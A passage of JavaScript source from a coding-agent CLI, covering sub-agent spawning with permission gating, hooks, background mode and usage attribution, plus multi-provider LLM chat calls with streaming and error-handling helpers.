      /* helper unavailable — sub-agent-context.js still fails closed at run() */
    }
  }

  // Phase 3: resolve declarative profile if requested. Explicit tools/context
  // override profile defaults; missing fields fall back to the profile.
  let profile = null;
  if (profileName) {
    try {
      const { getSubAgentProfile } =
        await import("../lib/sub-agent-profiles.js");
      profile = getSubAgentProfile(profileName);
      if (!profile) {
        return {
          error: `Unknown sub-agent profile: "${profileName}". Valid: explorer|executor|design`,
        };
      }
    } catch (_err) {
      // profile module optional — proceed without
    }
  }

  // A named subagent's body becomes the sub-agent system prompt (via the
  // profile.systemPrompt seam) when no declarative profile was requested.
  if (!profile && mdProfile) profile = mdProfile;

  let allowedTools = Array.isArray(explicitTools)
    ? explicitTools
    : profile?.toolAllowlist || null;
  // Deny-list: subtract from the resolved allow-list; with no allow-list
  // ("all tools"), subtract from the full built-in contract set. spawn itself
  // is always denied downstream by depth/breadth caps, so no special-casing.
  if (Array.isArray(disallowedTools) && disallowedTools.length > 0) {
    const deny = new Set(disallowedTools.map((t) => String(t).trim()));
    const base = Array.isArray(allowedTools)
      ? allowedTools
      : listCodingAgentToolNames();
    allowedTools = base.filter((t) => !deny.has(t));
  }

  // permissionMode enforcement into the child gate. Reuses the runner's own
  // resolvers (single-sourced, no drift); best-effort so it never breaks a spawn.
  //  • `plan` → clamp to the read-only tool set (same rule as resolveEnabledTools),
  //    so a plan sub-agent physically cannot mutate anything.
  //  • confirmer threading → hand the child the mode's NON-interactive confirmer
  //    as `permissionConfirm` (governs the ask / sensitive-file / destructive-git
  //    gates) ONLY when it is the autopilot (bypassPermissions) ALLOW confirmer.
  //    Every other mode's headless child already denies implicitly (no confirmer),
  //    so we leave it unset to stay byte-identical — crucially preserving the
  //    parallel-read fast-path + IDE-diff branch, both of which key off whether a
  //    permissionConfirm is present.
  //  • ApprovalGate sessionPolicy → attach the child its OWN ApprovalGate seeded
  //    with the mode's tier (perm.sessionPolicy) and NO confirmer, so run_shell /
  //    browser_act are gated per tier headlessly: strict denies MED/HIGH, trusted
  //    denies only HIGH, autopilot allows all (CONFIRM→no-confirmer→DENY). A fresh
  //    per-child gate (never the shared singleton) means zero interference with
  //    the parent's global confirmer. Attached ONLY when the mode was explicitly
  //    driven (permModeDriven) AND the tier actually gates (non-autopilot) — a
  //    plain default spawn stays ungated = byte-identical; autopilot's gate would
  //    be a pure no-op so it is skipped.
  // `tightenPermissionMode` already stops a child EXCEEDING the parent's mode; a
  // fully-defaulted spawn (→ "default") touches neither tools nor confirmer nor gate.
  let childPermissionConfirm = null;
  let childApprovalGate = null;
  if (effectiveContract?.permissionMode) {
    try {
      const { resolvePermissionMode, resolveEnabledTools } =
        await import("./headless-runner.js");
      const perm = resolvePermissionMode(effectiveContract.permissionMode);
      if (perm.readOnly) {
        allowedTools = resolveEnabledTools({ allowedTools, readOnly: true });
      }
      // autopilot ⟺ bypassPermissions — the only mode whose headless confirmer
      // ALLOWS. Threading a deny confirmer would needlessly disable the child's
      // parallel-read fast-path, so restrict to the allow case.
      if (
        perm.sessionPolicy === "autopilot" &&
        typeof perm.confirmer === "function"
      ) {
        childPermissionConfirm = perm.confirmer;
      }
      // Dedicated, confirmer-less child ApprovalGate for the strict/trusted tiers.
      if (permModeDriven && perm.sessionPolicy !== "autopilot") {
        const { ApprovalGate } = await import("@chainlesschain/session-core");
        childApprovalGate = new ApprovalGate({
          defaultPolicy: perm.sessionPolicy,
        });
      }
    } catch {
      // Enforcement is best-effort — never break the spawn.
    }
  }

  // Auto-condense parent context if caller didn't provide explicit context.
  // An explicit `context: fresh` contract suppresses this inheritance (the
  // child starts clean); `fork` / unset keep the existing auto-condense.
  let resolvedContext = inheritedContext || null;
  if (
    !resolvedContext &&
    explicitContext !== "fresh" &&
    Array.isArray(ctx.parentMessages)
  ) {
    const recentMsgs = ctx.parentMessages
      .filter((m) => m.role === "assistant" && typeof m.content === "string")
      .slice(-3)
      .map((m) => m.content.substring(0, 200));
    if (recentMsgs.length > 0) {
      resolvedContext = recentMsgs.join("\n---\n");
    }
  }

  // Link child to parent session so registry-scoped queries and
  // session-close cascade cleanup can find it.
  const parentSessionId = ctx.sessionId || null;
  const interaction = ctx.interaction || null;

  // settings.json SubagentStart hooks (Claude-Code parity): fire BEFORE the
  // sub-agent runs, so a policy hook can VETO the spawn (`block`) or INJECT
  // extra context that gets prepended to the child's inherited context. This is
  // the mirror of the existing SubagentStop fire (which runs after the summary
  // returns). Best-effort — a hook error never blocks the spawn.
  if (ctx.settingsHooks) {
    try {
      const startOutcome = runObserveHooks(
        ctx.settingsHooks,
        "SubagentStart",
        {
          session_id: parentSessionId,
          role: role || args.agent || null,
          subagent_task: String(task || "").substring(0, 2000),
        },
        { cwd: ctx.cwd },
      );
      if (startOutcome.decision === "block" && startOutcome.reason) {
        return {
          error: `spawn_sub_agent blocked by SubagentStart hook: ${startOutcome.reason}`,
        };
      }
      const injected = aggregateContext(startOutcome.results);
      if (injected) {
        resolvedContext = resolvedContext
          ? `${resolvedContext}\n---\n${injected}`
          : injected;
      }
    } catch (_err) {
      // SubagentStart hooks are best-effort — never break the spawn.
    }
  }

  // Inherit the parent's provider / base-url / key; a named subagent's `model:`
  // frontmatter (mdModel) overrides just the model, else keep the parent's.
  const parentLlm = ctx.llmOptions || {};
  const subLlmOptions = {
    ...parentLlm,
    model: mdModel || parentLlm.model || undefined,
    // Contract `effort` is a compute hint (reasoning level), not authority —
    // forwarded to the child loop; harmless if the provider ignores it.
    ...(effectiveContract?.effort ? { effort: effectiveContract.effort } : {}),
  };

  // 用量归因: forward the child's real token usage into the parent run's sink
  // (threaded through toolContext) so agentLoop re-yields it as attributed
  // `token-usage` events. A nested child's already-attributed record passes
  // through unchanged (deepest frame wins). subCtxRef closes over the created
  // context so the frame can carry the sub-agent's id.
  const usageSink = Array.isArray(ctx.subAgentUsageSink)
    ? ctx.subAgentUsageSink
    : null;
  let subCtxRef = null;
  const onUsage = usageSink
    ? (u) => {
        try {
          usageSink.push(
            u && u.attribution
              ? u
              : {
                  provider: u?.provider ?? null,
                  model: u?.model ?? null,
                  usage: u?.usage || null,
                  attribution: {
                    origin: "subagent",
                    subagentId: subCtxRef?.id || null,
                    role: subCtxRef?.role || role || null,
                    parentSessionId,
                    depth: currentDepth + 1,
                  },
                },
          );
        } catch (_e) {
          // usage forwarding is best-effort
        }
      }
    : null;

  // Worktree sparse-checkout + dependency symlink (large-monorepo lever): when
  // the child runs in an isolated worktree, only materialize the packages it
  // needs (sparsePaths) and reuse approved dep dirs (e.g. node_modules) from the
  // main checkout (symlinkDirectories). Mirrors the team-worktree passthrough;
  // spawn args win over the agent-file's values. Resolved ONLY when isolation is
  // on → absent for a non-worktree spawn = byte-identical (full checkout).
  let subWorktreeOptions = null;
  if (subIsolation === "worktree") {
    try {
      const { normalizeSparsePaths } =
        await import("../lib/worktree-sparse.js");
      const sparse = normalizeSparsePaths(
        args.sparsePaths ?? mdSparsePaths ?? null,
      );
      const symlink = args.symlinkDirectories ?? mdSymlinkDirectories ?? null;
      const wtOpts = {};
      if (sparse) wtOpts.sparsePaths = sparse;
      if (symlink != null) wtOpts.symlinkDirectories = symlink;
      if (Object.keys(wtOpts).length) subWorktreeOptions = wtOpts;
    } catch {
      subWorktreeOptions = null; // best-effort → full checkout on any error
    }
  }

  const subCtx = SubAgentContext.create({
    role,
    task,
    parentId: parentSessionId,
    // Hook-envelope tracing: the child loop stamps its own runId as trace_id
    // and THIS run's id as parent_id on every settings-hook payload it fires.
    hookParentTraceId: ctx.hookTraceId || null,
    inheritedContext: resolvedContext,
    allowedTools: allowedTools || null,
    cwd: ctx.cwd,
    profile: profile || null,
    llmOptions: subLlmOptions,
    depth: currentDepth + 1, // nested spawns see their own level
    // Same shared counter object so the child's own spawns draw from the run's
    // single total-sub-agent pool (breadth cap spans the whole tree).
    subAgentBudget: ctx.subAgentBudget || null,
    onUsage,
    // Extended contract (gap 2026-07-11): per-agent iteration cap + opt-in
    // worktree isolation. undefined keeps the profile/flag defaults intact.
    ...(subMaxTurns ? { maxIterations: subMaxTurns } : {}),
    ...(subIsolation === "worktree" ? { useWorktree: true } : {}),
    // Worktree sparse-checkout / dep-symlink options (large-monorepo); only
    // present for a worktree spawn that requested them (else full checkout).
    ...(subWorktreeOptions ? { worktreeOptions: subWorktreeOptions } : {}),
    // Resolved contract (gap 2026-07-12): cap the child's token budget and hand
    // it its EFFECTIVE contract so its OWN spawns inherit this ceiling.
    ...(effectiveContract?.budget?.tokens
      ? { tokenBudget: effectiveContract.budget.tokens }
      : {}),
    ...(effectiveContract ? { subAgentContract: effectiveContract } : {}),
    // Skill capability INTERSECT (2026-07-12): a non-null allow-list (possibly
    // empty) restricts run_skill/list_skills in the child loop.
    ...(skillAllowlist != null ? { skillAllowlist } : {}),
    // MCP + hook capability INHERITANCE (2026-07-12): only non-null when the
    // contract opted the child into inheriting (context:fork or an explicit
    // list). filterInherited* already subset these to the allowed servers /
    // matchers. Absent → child inherits neither (today's default).
    ...(inheritedMcp
      ? {
          extraToolDefinitions: inheritedMcp.extraToolDefinitions,
          externalToolDescriptors: inheritedMcp.externalToolDescriptors,
          externalToolExecutors: inheritedMcp.externalToolExecutors,
          mcpClient: inheritedMcp.mcpClient,
        }
      : {}),
    ...(inheritedHooks ? { settingsHooks: inheritedHooks } : {}),
    // Memory INHERITANCE (2026-07-12): grant the child the parent's memory DB
    // (namespaced by the child's task id) only when the contract allows; else
    // memoryEnabled:false hard-suppresses recall even if a db leaks through.
    ...(inheritedMemory
      ? {
          db: inheritedMemory.db,
          permanentMemory: inheritedMemory.permanentMemory,
          memoryEnabled: true,
        }
      : { memoryEnabled: false }),
    // permissionMode confirmer (2026-07-12): only set for the autopilot (bypass)
    // ALLOW confirmer; absent for every other mode so the child stays
    // implicitly-deny + byte-identical (parallel-read fast-path preserved).
    ...(childPermissionConfirm
      ? { permissionConfirm: childPermissionConfirm }
      : {}),
    // permissionMode ApprovalGate (2026-07-13): a dedicated confirmer-less gate
    // seeded with the mode's tier gates the child's run_shell / browser_act;
    // absent (ungated) for a plain default spawn = byte-identical.
    ...(childApprovalGate ? { approvalGate: childApprovalGate } : {}),
    ...(ctx.toolAdmission ? { toolAdmission: ctx.toolAdmission } : {}),
  });
  subCtxRef = subCtx;

  const emit = (type, payload) => {
    if (type === "sub-agent.started") {
      emitHooksV2Event("TaskCreated", {
        task_id: subCtx.id,
        session_id: parentSessionId,
        role: subCtx.role,
        task: subCtx.task,
        background: payload?.background === true,
      });
    } else if (
      type === "sub-agent.completed" ||
      type === "sub-agent.failed"
    ) {
      emitHooksV2Event("TaskCompleted", {
        task_id: subCtx.id,
        session_id: parentSessionId,
        role: subCtx.role,
        status: type === "sub-agent.failed" ? "failed" : "completed",
        error: payload?.error || null,
        completed_at: payload?.completedAt || null,
      });
    }
    if (!interaction || typeof interaction.emit !== "function") return;
    try {
      interaction.emit(type, {
        sessionId: parentSessionId,
        subAgentId: subCtx.id,
        parentSessionId,
        role: subCtx.role,
        ...payload,
      });
    } catch (_err) {
      // Event emission is best-effort — never break the tool call
    }
  };

  // Resolve the registry ONCE before the try so the failure path can also move
  // the sub-agent out of `_active` (the success path does this via complete()).
  const { SubAgentRegistry } =
    await import("../lib/sub-agent-registry.js").catch(() => ({
      SubAgentRegistry: null,
    }));
  let registry = null;
  if (SubAgentRegistry) {
    try {
      registry = SubAgentRegistry.getInstance();
    } catch (_err) {
      registry = null; // registry unavailable — non-critical
    }
  }

  // ── Background mode (Claude-Code 2.1.198 parity) ────────────────────────
  // Return a running handle immediately; the parent loop keeps working and
  // drains the result into the conversation when it settles (agentLoop also
  // refuses to finish while any background sub-agent is still running). Only
  // available when the calling loop provided the per-run map — a bare
  // executeTool() without it falls through to the blocking path.
  //
  // `background` is driven by the resolved contract (spawn arg > agent-file
  // definition), so an agent-file can declare `background: true` and be spawned
  // detached without the caller passing it. `effectiveContract.background`
  // already folds in `args.background`; the explicit OR keeps the path
  // byte-identical if contract resolution was skipped (effectiveContract null).
  const wantsBackground =
    args.background === true || effectiveContract?.background === true;
  if (wantsBackground && ctx.backgroundSubAgents instanceof Map) {
    // Cancel with the parent: forward the loop's abort signal so killing the
    // run doesn't orphan a detached child mid-LLM-call.
    subCtx._signal = subCtx._signal || ctx.signal || null;
    if (registry) {
      try {
        registry.register(subCtx);
      } catch (_err) {
        // Registry not available — non-critical
      }
    }
    emit("sub-agent.started", {
      task: subCtx.task,
      background: true,
      allowedTools: allowedTools || null,
      maxIterations: subCtx.maxIterations,
      createdAt: subCtx.createdAt,
    });
    const entry = {
      id: subCtx.id,
      role: subCtx.role,
      task: subCtx.task,
      settled: false,
      outcome: null,
      hookFeedback: null,
      promise: null,
    };
    // Settle-capture wrapper: the stored promise NEVER rejects, so an
    // unconsumed handle can't surface as an unhandled rejection.
    entry.promise = subCtx
      .run(task)
      .then(
        (result) => ({ result, error: null }),
        (err) => {
          subCtx.forceComplete(err.message);
          return { result: subCtx.result, error: err.message };
        },
      )
      .then((outcome) => {
        entry.settled = true;
        entry.outcome = outcome;
        if (registry) {
          try {
            registry.complete(subCtx.id, outcome.result);
          } catch (_err) {
            // Non-critical
          }
        }
        emit(outcome.error ? "sub-agent.failed" : "sub-agent.completed", {
          status: subCtx.status,
          background: true,
          ...(outcome.error
            ? { error: outcome.error }
            : {
                summary: outcome.result?.summary,
                toolsUsed: outcome.result?.toolsUsed,
                iterationCount: outcome.result?.iterationCount,
                tokenCount: outcome.result?.tokenCount,
                artifactCount: outcome.result?.artifacts?.length || 0,
              }),
          completedAt: subCtx.completedAt,
        });
        return outcome;
      });
    ctx.backgroundSubAgents.set(subCtx.id, entry);
    return {
      success: true,
      background: true,
      status: "running",
      subAgentId: subCtx.id,
      role: subCtx.role,
      parentSessionId,
      note: "Sub-agent is running in the background. Its result will be delivered to you automatically in a later turn — continue with other work; the run will not finish before the result arrives.",
    };
  }

  try {
    // Notify registry if available
    if (registry) {
      try {
        registry.register(subCtx);
      } catch (_err) {
        // Registry not available — non-critical
      }
    }

    emit("sub-agent.started", {
      task: subCtx.task,
      allowedTools: allowedTools || null,
      maxIterations: subCtx.maxIterations,
      createdAt: subCtx.createdAt,
    });

    const result = await subCtx.run(task);

    // Complete in registry
    if (registry) {
      try {
        registry.complete(subCtx.id, result);
      } catch (_err) {
        // Non-critical
      }
    }

    emit("sub-agent.completed", {
      status: subCtx.status,
      summary: result.summary,
      toolsUsed: result.toolsUsed,
      iterationCount: result.iterationCount,
      tokenCount: result.tokenCount,
      artifactCount: result.artifacts.length,
      completedAt: subCtx.completedAt,
    });

    return {
      success: true,
      subAgentId: subCtx.id,
      role: subCtx.role,
      parentSessionId,
      summary: result.summary,
      toolsUsed: result.toolsUsed,
      iterationCount: result.iterationCount,
      artifactCount: result.artifacts.length,
    };
  } catch (err) {
    subCtx.forceComplete(err.message);

    // Move the failed sub-agent out of the registry's `_active` Map into bounded
    // history (mirrors the success path). Without this, a sub-agent whose run()
    // threw outside its own try (setup/summarize error) lingers in `_active`
    // forever and over-reports as "active" to monitors/UI.
    if (registry) {
      try {
        registry.complete(subCtx.id, subCtx.result);
      } catch (_err) {
        // Non-critical
      }
    }

    emit("sub-agent.failed", {
      status: subCtx.status,
      error: err.message,
      completedAt: subCtx.completedAt,
    });

    return {
      error: `Sub-agent failed: ${err.message}`,
      subAgentId: subCtx.id,
      role: subCtx.role,
      parentSessionId,
    };
  }
}

// ─── LLM chat with tools ─────────────────────────────────────────────────

/**
 * Send a chat completion request with tool definitions.
 * Supports 8 providers: ollama, anthropic, openai, deepseek, dashscope, gemini, mistral, volcengine
 *
 * @param {Array} rawMessages
 * @param {object} options
 * @returns {Promise<object>} response with .message
 */
export async function chatWithTools(rawMessages, options) {
  const {
    provider,
    model,
    baseUrl,
    apiKey,
    contextEngine: ce,
    signal,
  } = options;

  const persona = _loadProjectPersona(options.cwd);
  // Merge the project-persona deny-list with any caller-supplied deny-list
  // (e.g. headless `--disallowed-tools`). Without this merge the caller's
  // deny-list is silently dropped and the tool stays callable.
  const mergedDisabledTools = [
    ...(Array.isArray(persona?.toolsDisabled) ? persona.toolsDisabled : []),
    ...(Array.isArray(options.disabledTools) ? options.disabledTools : []),
  ];
  const tools = getAgentToolDefinitions({
    names: options.enabledToolNames,
    disabledTools: mergedDisabledTools,
    extraTools: [
      ...(options.hostManagedToolPolicy?.toolDefinitions || []),
      ...(options.extraToolDefinitions || []),
    ],
  });

  const lastUserMsg = [...rawMessages].reverse().find((m) => m.role === "user");
  const messages = ce
    ? ce.buildOptimizedMessages(rawMessages, {
        userQuery: lastUserMsg?.content,
      })
    : rawMessages;

  throwIfAborted(signal);

  if (provider === "ollama") {
    const apiUrl = `${baseUrl}/api/chat`;
    // Multimodal (`cc agent --image`): ollama wants `{content, images:[base64]}`
    // not OpenAI-style `image_url` blocks. Convert only when an image part is
    // present so text-only runs keep the identical request shape.
    const ollamaMessages = hasImageContent(messages)
      ? toOllamaMessages(messages)
      : messages;
    // Real-time token deltas (Claude-Code `--include-partial-messages`): when
    // the caller supplies an onToken hook, stream the response and forward each
    // content chunk as it arrives. Tool calls + usage are accumulated and the
    // same {message, usage} shape is returned, so the agent loop is unchanged.
    // Without onToken we keep the cheaper single-shot non-streaming request.
    if (typeof options.onToken === "function") {
      return await _retryStreamingChat(
        () =>
          _chatOllamaStreaming(
            apiUrl,
            { model, messages: ollamaMessages, tools },
            options.onToken,
            signal,
            options.onStall,
            options.streamStallMs,
            options.streamStallTimeoutMs,
          ),
        { signal, onRetry: options.onStreamRetry },
      );
    }
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      signal,
      body: JSON.stringify({
        model,
        messages: ollamaMessages,
        tools,
        stream: false,
      }),
    });
    if (!response.ok) {
      throw new Error(formatProviderHttpError("ollama", response.status));
    }
    const data = await response.json();
    if (data.prompt_eval_count || data.eval_count) {
      data.usage = {
        input_tokens: data.prompt_eval_count || 0,
        output_tokens: data.eval_count || 0,
      };
    }
    return data;
  }

  if (provider === "anthropic") {
    const key = apiKey || process.env.ANTHROPIC_API_KEY;
    if (!key) throw new Error("ANTHROPIC_API_KEY required");

    const systemMsgs = messages.filter((m) => m.role === "system");
    const otherMsgs = messages.filter((m) => m.role !== "system");

    const anthropicTools = tools.map((t) => ({
      name: t.function.name,
      description: t.function.description,
      input_schema: t.function.parameters,
    }));

    // Prompt caching (Claude-Code parity, default-on): the system prompt + the
    // ~18 tool schemas are a large, stable prefix re-sent on every agent-loop
    // iteration. Marking the LAST tool and the system block as cache
    // breakpoints lets Anthropic serve that prefix from cache (~10% the input
    // cost, lower latency) across iterations and turns. Anthropic ignores a
    // breakpoint when the prefix is under the model's minimum cacheable size,
    // so it is always safe. Opt out (e.g. a custom gateway that rejects the
    // field) with CC_PROMPT_CACHE=0 or options.promptCaching:false.
    const cacheEnabled =
      options.promptCaching !== false && process.env.CC_PROMPT_CACHE !== "0";
    if (cacheEnabled && anthropicTools.length > 0) {
      const last = anthropicTools.length - 1;
      anthropicTools[last] = {
        ...anthropicTools[last],
        cache_control: { type: "ephemeral" },
      };
    }

    // Model-aware max_tokens (Opus → 16384, Haiku → 4096, else 8192) via
    // provider-options. We read ONLY maxTokens: the module's `temperature`
    // default is never forwarded (400s on Opus 4.7/4.8).
    // Fallback to the CURRENT Sonnet, not a retired snapshot:
    // claude-sonnet-4-20250514 was retired 2026-06-15 and would 404 here.
    const effModel = model || "claude-sonnet-4-6";
    const { maxTokens: anthropicMaxTokens } = mergeProviderOptions(
      "anthropic",
      effModel,
    );
    const body = {
      model: effModel,
      max_tokens: anthropicMaxTokens || 8192,
      // Convert cc's internal OpenAI-shaped history (role:"tool" results,
      // assistant tool_calls[]) into Anthropic content blocks. Without this,
      // multi-turn tool use 400s on turn 2 (Anthropic rejects role:"tool" and
      // assistant `tool_calls`). Also replays preserved thinking blocks.
      messages: _toAnthropicMessages(otherMsgs),
      tools: anthropicTools,
    };
    // Extended thinking — OPT-IN via options.thinking; off by default so the
    // request is byte-identical to before. Model-aware (adaptive+effort on Opus
    // 4.6+/Sonnet 4.6, legacy enabled+budget else; nothing on Haiku). temperature
    // is never sent. RUNTIME-UNVERIFIED: no Anthropic key here to E2E the
    // thinking-block signature replay (see cli_claude_code_parity_landed memory).
    const thinkingParams = _anthropicThinkingParams(
      effModel,
      options,
      body.max_tokens,
    );
    if (thinkingParams) Object.assign(body, thinkingParams);
    if (systemMsgs.length > 0) {
      const systemText = systemMsgs.map((m) => m.content).join("\n");
      // Array-form system with a cache breakpoint when caching is on; plain
      // string otherwise (byte-identical to the prior request shape).
      body.system = cacheEnabled
        ? [
            {
              type: "text",
              text: systemText,
              cache_control: { type: "ephemeral" },
            },
          ]
        : systemText;
    }

    const url =
      baseUrl && baseUrl !== "http://localhost:11434"
        ? baseUrl
        : "https://api.anthropic.com/v1";

    // Real token streaming (--include-partial-messages): stream the SSE response
    // and forward text deltas live, assembling tool_use blocks back into the
    // same {message, usage} shape the non-streaming path returns.
    if (typeof options.onToken === "function") {
      return await _retryStreamingChat(
        () =>
          _chatAnthropicStreaming(
            `${url}/messages`,
            { ...body, stream: true },
            { "x-api-key": key, "anthropic-version": "2023-06-01" },
            options.onToken,
            signal,
            options.onThinking,
            options.onStall,
            options.streamStallMs,
            options.streamStallTimeoutMs,
          ),
        { signal, onRetry: options.onStreamRetry },
      );
    }

    const response = await fetch(`${url}/messages`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key": key,
        "anthropic-version": "2023-06-01",
      },
      signal,
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      throw new Error(formatProviderHttpError("anthropic", response.status));
    }

    const data = await response.json();
    const normalized = _normalizeAnthropicResponse(data);
    if (data.usage) {
      normalized.usage = {
        // With prompt caching, Anthropic splits input into uncached
        // `input_tokens` + cache read/write — capture all three so cost
        // accounting prices the cached prefix correctly (read ≈ 0.1×,
        // write ≈ 1.25× input). Absent (caching off) → 0, byte-identical.
        input_tokens: data.usage.input_tokens || 0,
        output_tokens: data.usage.output_tokens || 0,
        cache_read_input_tokens: data.usage.cache_read_input_tokens || 0,
        cache_creation_input_tokens:
          data.usage.cache_creation_input_tokens || 0,
      };
    }
    return normalized;
  }

  // OpenAI-compatible providers
  const providerUrls = {
    openai: "https://api.openai.com/v1",
    deepseek: "https://api.deepseek.com/v1",
    dashscope: "https://dashscope.aliyuncs.com/compatible-mode/v1",
    mistral: "https://api.mistral.ai/v1",
    gemini: "https://generativelanguage.googleapis.com/v1beta/openai",
    volcengine: "https://ark.cn-beijing.volces.com/api/v3",
  };

  const providerApiKeyEnvs = {
    openai: "OPENAI_API_KEY",
    deepseek: "DEEPSEEK_API_KEY",
    dashscope: "DASHSCOPE_API_KEY",
    mistral: "MISTRAL_API_KEY",
    gemini: "GEMINI_API_KEY",
    volcengine: "VOLCENGINE_API_KEY",
  };

  const url =
    baseUrl && baseUrl !== "http://localhost:11434"
      ? baseUrl
      : providerUrls[provider];

  if (!url) {
    throw new Error(
      `Unsupported provider: ${provider}. Supported: ollama, anthropic, openai, deepseek, dashscope, mistral, gemini, volcengine`,
    );
  }

  const envKey = providerApiKeyEnvs[provider] || "OPENAI_API_KEY";
  const key = apiKey || process.env[envKey];
  if (!key) throw new Error(`${envKey} required for provider ${provider}`);

  const defaultModels = {
    openai: "gpt-4o",
    deepseek: "deepseek-chat",
    dashscope: "qwen-turbo",
    mistral: "mistral-large-latest",
    gemini: "gemini-2.0-flash",
    volcengine: "doubao-seed-2-1-pro-260628",
  };

  // Real token streaming (--include-partial-messages) for every OpenAI-compatible
  // provider (openai / deepseek / dashscope / mistral / gemini / volcengine):
  // stream the SSE response, forward content deltas live, and reassemble the
  // delta-fragmented tool_calls into the standard {message, usage} shape.
  if (typeof options.onToken === "function") {
    return await _retryStreamingChat(
      () =>
        _chatOpenAIStreaming(
          `${url}/chat/completions`,
          {
            model: model || defaultModels[provider] || "gpt-4o-mini",
            messages,
            tools,
            stream: true,
            stream_options: { include_usage: true },
          },
          key,
          options.onToken,
          signal,
          provider,
          options.onStall,
          options.streamStallMs,
          options.streamStallTimeoutMs,
        ),
      { signal, onRetry: options.onStreamRetry },
    );
  }

  const response = await fetch(`${url}/chat/completions`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${key}`,
    },
    signal,
    body: JSON.stringify({
      model: model || defaultModels[provider] || "gpt-4o-mini",
      messages,
      tools,
    }),
  });

  if (!response.ok) {
    throw new Error(formatProviderHttpError(provider, response.status));
  }

  const data = await response.json();
  if (!data.choices || !data.choices[0]) {
    throw new Error("Invalid API response: no choices returned");
  }
  const choice = data.choices[0];
  const out = { message: choice.message };
  if (data.usage) {
    // OpenAI/DeepSeek/volcengine report cached prompt tokens AS PART of
    // prompt_tokens — split them out so cost prices the cached prefix at the
    // provider's cache rate, not full input. 0 (or absent) → input unchanged.
    const cached = _openaiCachedTokens(data.usage);
    out.usage = {
      input_tokens: Math.max(0, (data.usage.prompt_tokens || 0) - cached),
      output_tokens: data.usage.completion_tokens || 0,
      cache_read_input_tokens: cached,
    };
  }
  return out;
}

// ─── Ollama streaming (token deltas for --include-partial-messages) ─────────
//
// Ollama `/api/chat` with `stream:true` returns NDJSON: one JSON object per
// line, each carrying an incremental `message.content` chunk, optional
// `message.tool_calls` (emitted whole, not byte-streamed), and a final line
// with `done:true` + `prompt_eval_count`/`eval_count` token totals. We reduce
// the stream line-by-line so onToken fires live, then finalize into the same
// {message, usage} shape the non-streaming branch returns.

function _ollamaInitState() {
  return {
    role: "assistant",
    content: "",
    toolCalls: null,
    promptEval: 0,
    evalCount: 0,
  };
}

function _ollamaReduceLine(state, line, onToken) {
  const s = (line || "").trim();
  if (!s) return state;
  let obj;
  try {
    obj = JSON.parse(s);
  } catch {
    return state; // tolerate partial/garbage lines mid-stream
  }
  const msg = obj.message;
  if (msg) {
    if (msg.role) state.role = msg.role;
    if (typeof msg.content === "string" && msg.content) {
      state.content += msg.content;
      if (typeof onToken === "function") {
        try {
          onToken(msg.content);
        } catch {
          // A failing UI hook must never break the agent run.
        }
      }
    }
    if (Array.isArray(msg.tool_calls) && msg.tool_calls.length) {
      state.toolCalls = (state.toolCalls || []).concat(msg.tool_calls);
    }
  }
  if (obj.prompt_eval_count) state.promptEval = obj.prompt_eval_count;
  if (obj.eval_count) state.evalCount = obj.eval_count;
  return state;
}

function _ollamaFinalize(state) {
  const message = { role: state.role, content: state.content };
  if (state.toolCalls && state.toolCalls.length) {
    message.tool_calls = state.toolCalls;
  }
  const data = { message };
  if (state.promptEval || state.evalCount) {
    data.usage = {
      input_tokens: state.promptEval,
      output_tokens: state.evalCount,
    };
  }
  return data;
}

/**
 * Pure reducer over an iterable of Ollama NDJSON lines. Exported for tests so
 * the parse/accumulate logic can be exercised without a live HTTP stream.
 */
export function _accumulateOllamaStream(lines, onToken) {
  const state = _ollamaInitState();
  for (const line of lines) _ollamaReduceLine(state, line, onToken);
  return _ollamaFinalize(state);
}

/**
 * Decide how to handle an error thrown mid-stream while reading an SSE / NDJSON
 * response body. Returns:
 *   - "rethrow"  — the error is a user abort (Esc / AbortController) or no
 *                  partial text was accumulated, so surface it to the caller.
 *   - "preserve" — a genuine connection drop (ECONNRESET / "terminated" /
 *                  server hangup) after some text already streamed to the user;
 *                  finalize and return what we have instead of replacing the
 *                  visible partial answer with a raw network error.
 *
 * Parity with Claude-Code 2.1.179 ("preserving partial responses instead of
 * showing raw errors"). Pure + exported for unit tests.
 */
export function _streamErrorDisposition(err, signal, partialText) {
  if (isAbortError(err)) return "rethrow";
  if (signal && signal.aborted) return "rethrow";
  if (typeof partialText === "string" && partialText.trim()) return "preserve";
  return "rethrow";
}

/**
 * Format a provider HTTP error with an actionable hint. 401/403 almost always
 * means a missing/invalid API key for the ACTIVE provider — and because the
 * provider is resolved from config, a surprise "anthropic 401" usually means
 * the effective provider differs from what the user configured. Name the
 * provider and point at the fix instead of dumping a bare status code. Pure +
 * exported for tests.
 */
export function formatProviderHttpError(provider, status) {
  const base = `${provider} API error: HTTP ${status}`;
  if (status === 401 || status === 403) {
    return (
      `${base} — authentication failed: the API key for provider "${provider}" ` +
      `is missing or invalid. Check "cc config get llm.provider" and ` +
      `"cc config get llm.apiKey" (or run Configure LLM). A surprise "${provider}" ` +
      `here usually means the effective provider differs from the one you configured.`
    );
  }
  if (status === 429) return `${base} — rate limited; please retry shortly.`;
  return base;
}

/**
 * Is this error from a streaming chat request a transient API CONNECTION drop
 * that is safe to retry? True only for genuine network failures (reset /
 * timeout / DNS / refused / socket hangup / undici "terminated" / "fetch
 * failed"). False for user aborts and for HTTP/status errors (a 4xx/auth/5xx is
 * the server's verdict carried in the message, not a dropped pipe — retrying a
 * connection that never dropped won't help and could double-bill).
 *
 * Safe to act on at the dispatch seam because any error that propagates OUT of
 * `_chat*Streaming` is either an abort or a drop with ZERO output already
 * streamed (partial-output drops are preserved internally and never throw) — so
 * a retry can never duplicate visible text. Pure + exported for tests.
 */
// Re-exported from the shared classifier (src/lib/stream-retry.js) so agent-core
// internals and existing test imports keep resolving it from this module, while
// the agent and chat streaming paths share ONE definition (no drift). The retry
// budget constants (STREAM_RETRY_MAX / STREAM_RETRY_BASE_MS) come from there too.
export const _isRetryableStreamError = isRetryableStreamError;
// 2.1.185 parity: when a streaming response goes silent mid-flight (the TCP
// connection is alive but no bytes arrive — a slow/overloaded API), surface a
// "waiting for API response" hint after this many ms instead of leaving the
// user staring at a frozen spinner. Upstream raised this from 10s to 20s.
const STREAM_STALL_MS = 20000;
// Hard inactivity timeout: a stream silent for this long is treated as a dead
// connection — the watchdog cancels the reader and throws a RETRYABLE error so
